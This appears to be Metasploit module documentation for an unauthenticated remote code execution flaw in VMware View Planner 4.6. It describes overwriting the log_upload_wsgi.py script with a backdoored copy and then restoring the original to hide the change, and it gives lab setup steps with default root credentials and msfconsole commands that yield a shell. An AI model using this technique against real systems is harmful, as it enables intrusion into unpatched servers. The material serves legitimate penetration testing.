## Vulnerable Application
VMWare View Planner 4.6 prior to 4.6 Security Patch 1 contained an log file upload script,
named `log_upload_wsgi.py`, which was mapped on to the web page `/logupload` and available
to unauthenticated users. Furthermore, unauthenticated users could browse the source code of
this file by navigating to `/wsgi_log_upload/log_upload_wsgi.py`, giving them an easy way to
ensure that they restored the original contents of the `log_upload_wsgi.py` file.

The module takes advantage of these two properties to first obtain the contents of the
`log_upload_wsgi.py` file and then overwrite it with a backdoored copy. Once a request has been
sent to `/logupload` to trigger the payload, the original copy of `log_upload_wsgi.py` is then
restored to ensure the target can continue its normal operations. Successful exploitation results
in RCE as the `apache` user within the `appacheServer` Docker container.

### Setup Steps

1. Sign up for an account at https://my.vmware.com/web/vmware/registration
1. Browse to https://my.vmware.com/web/vmware/downloads/details?downloadGroup=VIEW-PLAN-460&productId=1067&rPId=53394 and download the OVA file for View Planner Harness.
1. Verify the name of the downloaded OVA is viewplanner-harness-4.6.0.0-16995088_OVF10.ova and its hash is 4639f1916ffd30095cf5af383f38f7de
1. Install the VM and boot it up. When you get to the main screen, which will take several minutes, select Login with the arrow keys and log in with the username `root` and password `changeme`.
1. Run `~/viewplanner/setup/harness_first_boot.sh` to start the server.
1. Verify that the web server is accessible over port 80 or 443 and that the page at `/logupload` is accessible.

## Verification Steps

1. Install the server
1. Start msfconsole
1. Do: `use exploit/linux/http/vmware_view_planner_4_6_uploadlog_rce`
1. Do: `set rhosts [Target IP]`
1. Do: `set lhost [Local IP]`
1. Do: `exploit`
1. You should get a shell as the `apache` user on the target machine.
1. You should also see that the original copy of `log_upload_wsgi.py` is restored after you get a shell.
